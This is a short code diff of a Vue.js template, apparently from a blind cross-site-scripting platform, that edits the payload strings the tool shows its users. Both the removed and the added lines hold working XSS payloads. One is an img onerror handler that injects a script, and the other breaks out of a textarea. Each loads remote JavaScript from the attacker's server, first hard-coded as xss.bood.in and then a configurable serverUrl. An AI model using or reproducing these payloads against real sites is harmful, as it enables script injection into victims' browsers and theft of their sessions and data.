@@ -102,10 +102,10 @@
                 </div>
                 <div v-if="edit.alias">
                     <p class="code-block">
-                    {{ `&lt;img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.bood.in/code?id=${edit.alias}';&gt;`}}
+                    {{ `&lt;img id="xss" src=x onerror=s=createElement('script');body.appendChild(s);s.src='${serverUrl}/code?id=${edit.alias}';&gt;`}}
                     </p>
                     <p class="code-block">
-                        {{`&lt;/textarea&gt;'"&gt;&lt;script src=http://xss.bood.in/code?id=${edit.alias}&gt;&lt;/script&gt;`}}
+                        {{`&lt;/textarea&gt;'"&gt;&lt;script src=${serverUrl}/code?id=${edit.alias}&gt;&lt;/script&gt;`}}
                     </p>
                 </div>
                 
